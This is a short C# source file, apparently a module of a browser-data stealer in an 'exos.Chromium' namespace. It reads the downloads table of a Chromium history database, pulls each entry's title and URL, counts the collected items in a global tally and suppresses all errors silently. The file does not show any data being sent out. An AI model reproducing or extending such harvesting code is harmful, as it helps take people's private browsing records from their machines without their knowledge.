using System.Collections.Generic;

namespace exos.Chromium;

internal sealed class Downloads
{
	public static List<Site> Get(string sHistory)
	{
		List<Site> list = new List<Site>();
		try
		{
			SQLite sQLite = SqlReader.ReadTable(sHistory, "downloads");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Site item = default(Site);
				item.sTitle = Crypto.GetUTF8(sQLite.GetValue(i, 2));
				item.sUrl = Crypto.GetUTF8(sQLite.GetValue(i, 17));
				Counting.Downloads++;
				list.Add(item);
			}
		}
		catch
		{
		}
		return list;
	}
}
